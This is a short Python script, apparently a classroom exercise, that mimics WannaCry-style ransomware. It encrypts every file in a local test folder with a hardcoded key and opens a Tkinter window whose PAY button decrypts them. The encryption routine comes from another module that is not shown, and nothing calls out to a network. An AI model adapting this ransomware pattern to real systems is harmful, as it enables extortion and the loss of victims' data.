import tkinter as tk
import os
import os.path
import sys

from ex_8 import encrypt, decrypt

code = '123456789'


def victim_accept_paying():
    for f in os.listdir('./test_wanna_cry'):
        try:
            fp = os.path.abspath('./test_wanna_cry/' + f)
            decrypt(fp, code, paid=True)
        except Exception:
            pass
    sys.exit()


def start_wanna_cry():
    root = tk.Tk()

    frame = tk.Frame(root)
    frame.pack()

    msgb = tk.Message(frame, text='Your data under test_wanna_cry is affected, click on PAY to fix this')
    msgb.pack(side=tk.TOP)

    pbtn = tk.Button(frame, text='PAY', command=victim_accept_paying)
    pbtn.pack(side=tk.BOTTOM)

    root.mainloop()


if __name__ == '__main__':
    for f in os.listdir('./test_wanna_cry'):
        fp = os.path.abspath('./test_wanna_cry/' + f)
        encrypt(fp, code)

    start_wanna_cry()
